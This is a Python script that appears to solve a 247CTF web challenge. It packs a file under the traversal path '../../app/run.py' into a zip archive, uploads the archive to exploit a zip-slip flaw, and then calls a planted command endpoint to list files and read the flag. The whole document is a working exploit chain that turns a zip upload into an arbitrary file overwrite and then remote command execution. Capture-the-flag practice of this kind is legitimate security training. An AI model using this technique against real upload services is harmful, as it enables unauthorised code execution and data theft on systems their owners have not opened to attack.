import zipfile
import requests

ctf_url = "https://fc88b2d3d7f4d145.247ctf.com"

zip_out = "zipslip.zip"
print("Creating ZIP file with custom 'run.py' that will abuse directory traversal (zip slip)...")
zip = zipfile.ZipFile(zip_out, "w")
zip.write("custom_run.py", "../../app/run.py")
zip.close()

print("Uploading malicious ZIP...")
resp = requests.post(f"{ctf_url}/zip_upload", files={"zarchive": (zip_out, open(zip_out, "rb"), "application/octet-stream")})
print(f"Response: {resp.text}")

print("Listing directory to get flag filename...")
resp = requests.get(f"{ctf_url}/1337", [("cmd", "ls")])
flag_file_start = resp.text.find("flag")
flag_file_end = resp.text.find(".txt", flag_file_start)
flag_file = resp.text[flag_file_start:flag_file_end + 4]
print(f"Flag file: {flag_file}")

resp = requests.get(f"{ctf_url}/1337", [("cmd", f"cat {flag_file}")])
print(f"Flag: {resp.text}")
